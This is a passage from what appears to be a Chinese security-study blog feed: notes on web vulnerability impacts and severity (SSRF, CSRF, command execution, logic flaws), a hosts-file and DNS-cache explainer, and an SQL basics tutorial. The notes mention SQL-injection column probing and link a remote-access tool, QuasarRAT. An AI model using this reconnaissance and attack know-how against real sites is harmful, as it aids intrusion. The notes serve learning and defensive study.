id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><blockquote><p>通过任意文件下载，可以下载服务器的任意文件，web业务的代码，服务器和系统的具体配置信息，也可以下载数据库的配置信息，以及对内网的信息探测等等</p></blockquote><h4 id="CSRF（用户请求伪造）"><a href="#CSRF（用户请求伪造）" class="headerlink" title="CSRF（用户请求伪造）"></a>CSRF（用户请求伪造）</h4><blockquote><ol><li>以受害者名义发送邮件，发消息，盗取受害者的账号，甚至购买商品，虚拟货币转账，修改受害者的网络配置（比如修改路由器DNS、重置路由器密码）等等</li><li>个人隐私泄露、机密资料泄露、用户甚至企业的财产安全</li></ol></blockquote><h4 id="SSRF-（服务器端请求伪造）"><a href="#SSRF-（服务器端请求伪造）" class="headerlink" title="SSRF （服务器端请求伪造）"></a>SSRF （服务器端请求伪造）</h4><blockquote><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</li><li>攻击运行在内网或本地的应用程序</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用file协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol></blockquote><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><blockquote><p>远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，被攻击者间接控制服务器</p></blockquote><h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><blockquote><ol><li>代码执行漏洞造成的原理是由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。造成代码执行相关的函数分别是：eval、assert函数</li><li>暴露服务器信息</li><li>木马植入</li><li>敏感文件暴露</li><li>可能升级为命令执行</li></ol></blockquote><h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><blockquote><ol><li>在提交订单的时候抓取数据包或者直接修改前端代码，然后对订单的金额任意修改。</li><li>黑客只需要抓取Response数据包便知道验证码是多少或直接绕过</li><li>有些业务的接口，因为缺少了对用户的登陆凭证的较验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作</li><li>有些关键性的接口因为没有做验证或者其它预防机制，容易遭到枚举攻击</li><li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举</li><li>单纯读取内存值数据来当作用户凭证</li><li>用户修改密码时，邮箱中会收到一个含有auth的链接，在有效期内用户点击链接，即可进入重置密码环节。而大部分网站对于auth的生成都是采用rand()函数，那么这里就存在一个问题了，Windows环境下rand()最大值为32768，所以这个auth的值是可以被枚举的</li></ol></blockquote><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><blockquote><ol><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ol></blockquote><h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><blockquote><p>攻击者通过访问网站某一目录时，该目录没有默认首页文件或没有正确设置默认首页文件，将会把整个目录结构列出来，将网站结构完全暴露给攻击者； 攻击者可能通过浏览目录结构，访问到某些隐秘文件（如PHPINFO文件、服务器探针文件、网站管理员后台访问地址、数据库连接文件等）</p></blockquote><h3 id="简要说明以上漏洞等级划分"><a href="#简要说明以上漏洞等级划分" class="headerlink" title="简要说明以上漏洞等级划分"></a>简要说明以上漏洞等级划分</h3><p>漏洞危害决定漏洞等级</p><p>高危漏洞：SQL注入、文件上传、文件包含、代码执行、未授权访问、命令执行</p><p>影响：直接影响到网站权限和数据库权限，能够获取数据或者网站的敏感文件。涉及到数据安全和权限的丢失都为高危漏洞</p><p>中危漏洞：反序列化、逻辑安全</p><p>低危漏洞：XSS跨站、目录遍历、文件读取</p><p>影响：网站的源码，网站部分账号密码</p><h3 id="简要说明以上漏洞重点内容"><a href="#简要说明以上漏洞重点内容" class="headerlink" title="简要说明以上漏洞重点内容"></a>简要说明以上漏洞重点内容</h3><p>CTF：SQL注入、文件上传、反序列化、代码执行</p><p>SRC：图片上漏洞都能出现，逻辑安全出现比较多</p><p>红蓝对抗：涉及的高危漏洞，文件上传、文件包含、代码执行、命令执行</p><h3 id="简要说明以上漏洞形势问题"><a href="#简要说明以上漏洞形势问题" class="headerlink" title="简要说明以上漏洞形势问题"></a>简要说明以上漏洞形势问题</h3><p>找不到漏洞是因为：信息收集没做好，自己对漏洞的理解不够</p><h1 id="其他知识"><a href="#其他知识" class="headerlink" title="其他知识"></a>其他知识</h1><h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a><code>robots.txt</code></h2><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210260117963.png" alt="image-20221026011711587" style="zoom:50%;" /><p>有时候我们可以在<code>robots.txt</code>里看到一些网站信息：，比如说网站用什么搭建的，使用的程序源码是什么</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210260118310.png" alt="image-20221026011858979" style="zoom:50%;" /><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>b站小迪安全</li><li><a href="https://www.yuque.com/gemaxianrenhm/hahwdw/qeccme">语雀笔记</a></li><li><a href="https://cloud.tencent.com/developer/article/1748394">30余种加密编码类型的密文特征分析（建议收藏）</a></li></ul></blockquote><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><blockquote><ul><li>逍遥模拟器<a href="http://www.xyaz.cn/">http://www.xyaz.cn</a> </li><li>wsexplorer<strong>进程</strong>抓包工具<a href="http://www.downcc.com/soft/11196.html">http://www.downcc.com/soft/11196.html</a> </li><li>Quasar类似cs的远控工具<a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a> </li><li>漏了个大洞<a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg%E6%8F%90%E5%8F%96%E7%A0%81">https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg提取码</a>: 0b7b</li></ul><blockquote><p>该工具直接逆向尝试提取出app中的文件</p></blockquote></blockquote><blockquote><p><a href="https://ctf.bugku.com/challenges">CTF靶场</a></p></blockquote><blockquote><h2 id="声明："><a href="#声明：" class="headerlink" title="声明："></a><strong>声明：</strong></h2><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>本机域名解析文件 hosts</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%9C%AC%E6%9C%BA%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%96%87%E4%BB%B6-hosts.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/%E6%9C%AC%E6%9C%BA%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%96%87%E4%BB%B6-hosts.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Hosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><h2 id="hosts文件在哪"><a href="#hosts文件在哪" class="headerlink" title="hosts文件在哪"></a>hosts文件在哪</h2><h3 id="Win10系统"><a href="#Win10系统" class="headerlink" title="Win10系统"></a>Win10系统</h3><p>在Windows系统中，包括XP、Win7、Win8以及最新的Win10系统中，hosts文件都是位于系统盘的Windows文件夹夹下，文件位置路径如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><h3 id="linux操作系统中"><a href="#linux操作系统中" class="headerlink" title="linux操作系统中"></a>linux操作系统中</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="hosts文件修改后为什么有时候不会立即生效呢？"><a href="#hosts文件修改后为什么有时候不会立即生效呢？" class="headerlink" title="hosts文件修改后为什么有时候不会立即生效呢？"></a>hosts文件修改后为什么有时候不会立即生效呢？</h2><p>经常做Web开发的工程师，都会遇到需要将某个域名绑定到特定IP上，进行测试的情况。大家一般都会用修改hosts文件的方式来解决，但是经常也会遇到修改hosts不生效的情况，而且有时生效，有时不生效的情况也有发生，这到底是为什么呢？</p><h3 id="DNS缓存机制"><a href="#DNS缓存机制" class="headerlink" title="DNS缓存机制"></a>DNS缓存机制</h3><blockquote><p>关于DNS缓存的机制，有一篇非常详细的文章<a href="http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/">What really happens when you navigate to a URL</a>。</p></blockquote><p>简单来说，一条域名的DNS记录会在本地有两种缓存：浏览器缓存和操作系统(OS)缓存。在浏览器中访问的时候，会优先访问浏览器缓存，如果未命中则访问OS缓存，最后再访问DNS服务器(一般是ISP提供)，然后DNS服务器会递归式的查找域名记录，然后返回。<br>DNS记录会有一个ttl值(time to live)，单位是秒，意思是这个记录最大有效期是多少。经过实验，OS缓存会参考ttl值，但是不完全等于ttl值，而<strong>浏览器DNS缓存的时间跟ttl值无关，每种浏览器都使用一个固定值。</strong><br>后来我也做过测试，Mac下Chrome(23.0.1271.101)的DNS缓存时间是1分钟。Safari下DNS缓存时间大约为10秒。</p><h3 id="hosts文件修改的原理"><a href="#hosts文件修改的原理" class="headerlink" title="hosts文件修改的原理"></a>hosts文件修改的原理</h3><p>那么在修改hosts文件之后，发生了什么事情呢？这里不妨先提提Chrome下的一个工具：<code>chrome://net-internals/#dns</code>。这里列出了目前系统中的DNS缓存和Chrome中使用的情况。通过这个工具，可以看到：<br><strong>在修改hosts文件后，所有OS中DNS缓存会被清空，而浏览器缓存则不发生变化。</strong></p><p>网上盛传<code>chrome://net-internals/#dns</code>下的”Clear Host Cache”可以清空DNS缓存，这里博主做了一个测试，这里清空的仅仅是OS的缓存，而并非浏览器DNS缓存。当某条DNS记录显示”Expired”的时候，才表示浏览器DNS缓存已经被清除。所以使用Clear Host Cache其实是没有用的。</p><p>那么回到最初的问题上来，为什么修改hosts文件之后，有时会立刻生效，有时却一直不生效呢？其实原因很简单，这是因为浏览器缓存的过期时间，是从某个域名上次查询DNS记录开始计算的。</p><p>例如：我00秒的时候使用chrome访问过<code>www.google.com.hk</code>，此时浏览器DNS缓存产生，然后我修改了hosts文件，将 <code>www.google.com.hk</code>指向本地127.0.0.1，然后在05秒的时候尝试再次访问这个地址，因为浏览器DNS缓存未过期，所以hosts 修改无法体现出来。<br>另一种情况下，我很久都没有访问<code>www.baidu.com</code>了，然后我修改了hosts文件，将其指向127.0.0.1，这时因为浏览器没有DNS缓存，所以会查询操作系统中的DNS缓存，结果此时hosts文件生效！<br>前面也提到，Safari的浏览器DNS缓存时间大约为10秒，所以一般调试程序的时候，很多人都习惯修改hosts后，用Safari来调试，因为大部分情况下，修改hosts之后，浏览器DNS缓存已经失效了。<br>那么怎么主动清除浏览器DNS缓存呢？博主目前也没有找到办法，测试过Chrome下的“清除缓存”选项，发现没有起到期望的效果。<br>那么，就请在修改hosts之后，耐下心来，稍等几十秒吧。</p><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 应用层 </category>
          
          <category> DNS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL常用语句及知识</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5%E5%8F%8A%E7%9F%A5%E8%AF%86.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/SQL%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5%E5%8F%8A%E7%9F%A5%E8%AF%86.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL简介"><a href="#SQL简介" class="headerlink" title="SQL简介"></a>SQL简介</h1><blockquote><p>常见的sql语句：<a href="https://blog.csdn.net/promsing/article/details/112793260">https://blog.csdn.net/promsing/article/details/112793260</a></p></blockquote><h2 id="什么是数据库？"><a href="#什么是数据库？" class="headerlink" title="什么是数据库？"></a>什么是数据库？</h2><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091537660.png" alt="image-20221009153709478" style="zoom:50%;" /><h2 id="什么是SQL"><a href="#什么是SQL" class="headerlink" title="什么是SQL?"></a>什么是SQL?</h2><p>SQL是一种数据库查询和程序设计语言。用于存取数据以及查询、更新和管理关系数据库系统。</p><p>常见的SQL数据库有MySQL，SQL server，Access，Postsql，SQLite，Mongodb，Oracle、Sybase、db2….不同的数据库所使用的SQL语句也不一样。</p><h2 id="MySQL数据库结构"><a href="#MySQL数据库结构" class="headerlink" title="MySQL数据库结构"></a>MySQL数据库结构</h2><p>数据库中包含表，表是由列组成，表的数据存储方式是按行存储。</p><h1 id="SQL常用语句"><a href="#SQL常用语句" class="headerlink" title="SQL常用语句"></a>SQL常用语句</h1><h2 id="SELECT-语句"><a href="#SELECT-语句" class="headerlink" title="SELECT 语句"></a>SELECT 语句</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法：一列就是一个字段</span><br><span class="line">    <span class="keyword">SELECT</span> 列名 <span class="keyword">FROM</span> 表名</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名</span><br><span class="line">    </span><br><span class="line"><span class="keyword">select</span> version(); #查看 mysql 版本</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(); #查看当前用户</span><br><span class="line"><span class="keyword">select</span> database(); #查看当前打开的数据库</span><br></pre></td></tr></table></figure><h2 id="CREATE-TABLE-语句"><a href="#CREATE-TABLE-语句" class="headerlink" title="CREATE TABLE 语句"></a>CREATE TABLE 语句</h2><p>CREATE TABLE 语句用于创建数据库中的表。</p><p>表由行和列组成，每个表都必须有个表名。</p><h3 id="SQL-CREATE-TABLE-语法"><a href="#SQL-CREATE-TABLE-语法" class="headerlink" title="SQL CREATE TABLE 语法"></a>SQL CREATE TABLE 语法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (column_name1 data_type(size),column_name2 data_type(size),column_name3 data_type(size), .... );</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">column_name #参数规定表中列的名称。</span><br><span class="line">data_type #参数规定列的数据类型（例如 <span class="type">varchar</span>、<span class="type">integer</span>、<span class="type">decimal</span>、<span class="type">date</span> 等等）。</span><br><span class="line">size #参数规定表中列的最大长度。</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table hack</span><br><span class="line">-&gt; (</span><br><span class="line">-&gt; id int,</span><br><span class="line">-&gt; username varchar(30),</span><br><span class="line">-&gt; password varchar(30)-&gt; );</span><br></pre></td></tr></table></figure><h2 id="INSERT-INTO-语句"><a href="#INSERT-INTO-语句" class="headerlink" title="INSERT INTO 语句"></a>INSERT INTO 语句</h2><p>用于向表格中插入<strong>新的行</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法：</span><br><span class="line">    <span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名称 <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line">    #一列一列的添加数据</span><br><span class="line">    <span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (列<span class="number">1</span>, 列<span class="number">2</span>,...) <span class="keyword">VALUES</span> (值<span class="number">1</span>, 值<span class="number">2</span>,....)</span><br><span class="line">    #在指定的列中插入数据，比如说在指定的列<span class="number">1</span>和列<span class="number">2</span>添加值<span class="number">1</span>和值<span class="number">2</span></span><br></pre></td></tr></table></figure><p><strong>以”Persons” 表为例：</strong></p><table><thead><tr><th>LastName</th><th>FirstName</th><th>Address</th><th>City</th></tr></thead><tbody><tr><td>Carter</td><td>Thomas</td><td>Changan Street</td><td>Beijing</td></tr><tr><td>Gates</td><td>Bill</td><td>Xuanwumen 10</td><td>Beijing</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Persons (LastName, Address) <span class="keyword">VALUES</span> (<span class="string">&#x27;Wilson&#x27;</span>, <span class="string">&#x27;Champs-Elysees&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a>DELETE 语句</h2><p>用于<strong>删除表中的行，注意是删除一行</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法：</span><br><span class="line">    <span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列名称 <span class="operator">=</span> 值</span><br><span class="line">    <span class="keyword">DELETE</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名称</span><br></pre></td></tr></table></figure><h2 id="Update-语句"><a href="#Update-语句" class="headerlink" title="Update 语句"></a>Update 语句</h2><blockquote><p>update更新表，set修改数据</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法：用于修改表中的数据。</span><br><span class="line">    <span class="keyword">UPDATE</span> 表名称 <span class="keyword">SET</span> 列名称 <span class="operator">=</span> 新值 <span class="keyword">WHERE</span> 列名称 <span class="operator">=</span> 某值</span><br></pre></td></tr></table></figure><h2 id="Order-by-语句"><a href="#Order-by-语句" class="headerlink" title="Order by 语句"></a>Order by 语句</h2><blockquote><ul><li>用于对结果集进行排序。</li><li>用于<strong>根据指定的列</strong>对结果集进行排序。</li><li><strong>默认按照升序</strong>对记录进行排序；</li><li>按照降序对记录排序，语句后面使用<strong>DESC</strong>关键字；</li><li>order by 排序列数大于当前查询的列数时就会报错；</li><li><a href="https://blog.csdn.net/wangyuxiang946/article/details/121058067">sql注入利用这个特性来判断列数以及显示位</a></li></ul></blockquote><p><code>SELECT Company FROM Orders ORDER BY 2</code>表示以第二列排序，此时当然不会报错</p><p><code>SELECT Company FROM Orders ORDER BY 3</code>表示以第三列排序，此时会报错，因为我们没有第三列，所以我们根据order by语句可以判断出当前表的列数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#实例<span class="number">1</span>   <span class="keyword">Order</span>表以字母顺序显示公司名称（Company），若有相同公司的就用顺序号（OrderNumber）排序：</span><br><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company, OrderNumber</span><br></pre></td></tr></table></figure><table><thead><tr><th>Company</th><th>OrderNumber</th></tr></thead><tbody><tr><td>Apple</td><td>4698</td></tr><tr><td>IBM</td><td>3532</td></tr><tr><td>W3School</td><td>2356</td></tr><tr><td>W3School</td><td>6953</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#实例 <span class="number">2</span>  以逆字母顺序显示公司名称：</span><br><span class="line"><span class="keyword">SELECT</span> Company, OrderNumber <span class="keyword">FROM</span> Orders <span class="keyword">ORDER</span> <span class="keyword">BY</span> Company <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>Company</th><th>OrderNumber</th></tr></thead><tbody><tr><td>W3School</td><td>6953</td></tr><tr><td>W3School</td><td>2356</td></tr><tr><td>IBM</td><td>3532</td></tr><tr><td>Apple</td><td>4698</td></tr></tbody></table><h2 id="Where-语句"><a href="#Where-语句" class="headerlink" title="Where 语句"></a>Where 语句</h2><blockquote><p>AND  和 OR  运算符<br>AND  和 OR  可在 WHERE  子语句中把两个或多个条件结合起来。<br>如果第一个条件和第二个条件都成立，则 AND  运算符显示一条记录。<br>如果第一个条件和第二个条件中只要有一个成立，则 OR  运算符显示一条记录。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#语法：   有条件地从表中选取数据。</span><br><span class="line">    <span class="keyword">SELECT</span> 列名称 <span class="keyword">FROM</span> 表名称 <span class="keyword">WHERE</span> 列 运算符 值</span><br></pre></td></tr></table></figure><h2 id="Limit-控制输出"><a href="#Limit-控制输出" class="headerlink" title="Limit  控制输出"></a>Limit  控制输出</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users limit <span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line">#以对服务器数据库操作为例，limit限制控制输出</span><br><span class="line">limit <span class="number">2</span>，<span class="number">3</span>，表示从第<span class="number">3</span>为开始输出三行数据</span><br><span class="line">limit a，b，表示从a<span class="operator">+</span><span class="number">1</span>行开始输出b行数据</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091540534.png" alt="image-20221009154023393" style="zoom:50%;" /><h2 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h2><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。union 联合查询可以一次性执行两个或多个查询，并将它们的结果组合在一起输出显示。</p><p>请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p><h3 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL UNION 语法"></a>SQL UNION 语法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1 <span class="keyword">UNION</span> <span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure><p><strong>注释：</strong>默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p><h3 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL UNION ALL 语法"></a>SQL UNION ALL 语法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table1 <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure><p><strong>注释：</strong>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p><h1 id="MySQL常用函数及语法"><a href="#MySQL常用函数及语法" class="headerlink" title="MySQL常用函数及语法"></a>MySQL常用函数及语法</h1><h2 id="MySql连接数据库"><a href="#MySql连接数据库" class="headerlink" title="MySql连接数据库"></a>MySql连接数据库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p password</span><br><span class="line">mysql -u root -e <span class="string">&quot;create database xxx&quot;</span></span><br></pre></td></tr></table></figure><h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">01</span>、显示数据库 <span class="keyword">show</span> databases；<span class="operator">/</span><span class="operator">/</span>注意有s</span><br><span class="line"><span class="number">02</span>、打开数据库 use db_name;</span><br><span class="line"><span class="number">03</span>、显示数据表 <span class="keyword">show</span> tables;<span class="operator">/</span><span class="operator">/</span>注意s</span><br><span class="line"><span class="number">04</span>、显示表结构 <span class="keyword">describe</span> table_name;#<span class="keyword">desc</span>缩写</span><br><span class="line"><span class="number">05</span>、显示表中各字段信息，即表结构 <span class="keyword">show</span> columns <span class="keyword">from</span> table_name;</span><br><span class="line"><span class="number">06</span>、显示表创建过程 <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> 表名;</span><br><span class="line"><span class="number">07</span>、列出当前mysql的相关状态信息 status;</span><br><span class="line"><span class="number">08</span>、删除数据库 <span class="keyword">drop</span> database 数据库名;</span><br><span class="line"><span class="number">09</span>、清空数据表 <span class="keyword">delete</span> <span class="keyword">from</span> table_name; <span class="keyword">truncate</span> <span class="keyword">table</span> table_name;<span class="operator">/</span><span class="operator">/</span><span class="keyword">delete</span>和<span class="keyword">truncate</span>的区别https:<span class="operator">/</span><span class="operator">/</span>blog.csdn.net<span class="operator">/</span>weixin_34239169<span class="operator">/</span>article<span class="operator">/</span>details<span class="operator">/</span><span class="number">90097590</span></span><br><span class="line"><span class="number">10</span>、删除数据表 <span class="keyword">drop</span> <span class="keyword">table</span> table_name</span><br><span class="line"><span class="number">11</span>、数据库连接 mysql <span class="operator">-</span>uroot <span class="operator">-</span>proot</span><br><span class="line"><span class="number">12</span>、数据库退出 exit</span><br></pre></td></tr></table></figure><h3 id="LIMIT语句"><a href="#LIMIT语句" class="headerlink" title="LIMIT语句"></a>LIMIT语句</h3><p>LIMIT 是 MySQL 内置函数，其作用是用于限制查询结果的行数；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#其语法格式</span><br><span class="line">LIMIT[位置偏移量,]行数</span><br></pre></td></tr></table></figure><p>其中，中括号里面的参数是可选参数，位置偏移量是指 MySQL 查询分析器要从哪一行开始显示，索引值从 0 开始，即第一条记录位置偏移量是 0，第二条记录的位置偏移量是 1,依此类推…，第二个参数为“行数”即指示返回的记录条数。</p><p>例 1：取出列表中数据的 5 条记录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users limit 5</span><br></pre></td></tr></table></figure><p>例 2： 显示第 2 行记录以后的 3 行记录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users limit 2，3;</span><br></pre></td></tr></table></figure><p>例 3：显示第 0 行记录以后的 1 行记录，也就是上面演示的语句；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users limit 0，1;</span><br></pre></td></tr></table></figure><h2 id="concat、concat-ws、group-concat区别"><a href="#concat、concat-ws、group-concat区别" class="headerlink" title="concat、concat_ws、group_concat区别"></a>concat、concat_ws、group_concat区别</h2><h3 id="concat用法："><a href="#concat用法：" class="headerlink" title="concat用法："></a>concat用法：</h3><p>功能：将多个字符串连接成一个字符串。<br>语法：concat(str1, str2,…)</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091541705.png" alt="image-20221009154107353" style="zoom:33%;" /><h3 id="concat-ws用法"><a href="#concat-ws用法" class="headerlink" title="concat_ws用法:"></a>concat_ws用法:</h3><p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符（concat_ws就是concat with separator）<br> 语法：concat_ws(separator, str1, str2, …)</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091541364.png" alt="image-20221009154149147" style="zoom:33%;" /><h3 id="group-concat用法："><a href="#group-concat用法：" class="headerlink" title="group_concat用法："></a>group_concat用法：</h3><p>功能：将<code>group by</code>产生的同一个分组中的值连接起来，返回一个字符串结果。<br>语法：<code>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ][separator &#39;分隔符&#39;] )</code></p><blockquote><ul><li><a href="https://www.runoob.com/sql/sql-groupby.html">SQL GROUP BY 语句</a></li><li><a href="https://www.cnblogs.com/jingfengling/p/5962182.html">SQL中Group By的使用 </a></li><li><a href="https://www.cnblogs.com/goloving/p/13942595.html">MySQL中group_concat函数用法总结 </a>讲的很清楚</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210091542233.png" alt="image-20221009154205013" style="zoom: 33%;" /><h2 id="MySQL注释符"><a href="#MySQL注释符" class="headerlink" 